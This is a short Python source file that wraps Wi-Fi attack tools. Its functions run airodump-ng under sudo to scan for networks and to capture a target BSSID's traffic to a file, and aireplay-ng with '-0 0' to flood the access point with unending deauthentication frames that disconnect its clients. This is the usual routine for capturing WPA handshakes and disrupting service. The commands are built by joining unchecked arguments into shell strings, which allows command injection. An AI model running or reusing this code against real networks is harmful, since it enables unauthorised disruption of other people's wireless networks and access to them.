import os
import time
import vars

''' 
chno= channel number
w =  any name for capture file
bssid= bssid
'''

def grab1 ():
  return(
    print("========================================================="),
    print(),
    os.system("sudo airodump-ng "+vars.intf),
    time.sleep(2))

def grab2 (chno,bssid,w):
  return(
    print("========================================================="),
    print(),
    os.system("sudo airodump-ng -c "+chno+" --bssid "+bssid+" -w "+w+" " +vars.intf ),
    time.sleep(1))

def aireplay (bssid):
  return(
    print("========================================================="),
    print(),
    os.system("sudo aireplay-ng -0 0 -a "+bssid+" "+vars.intf ))
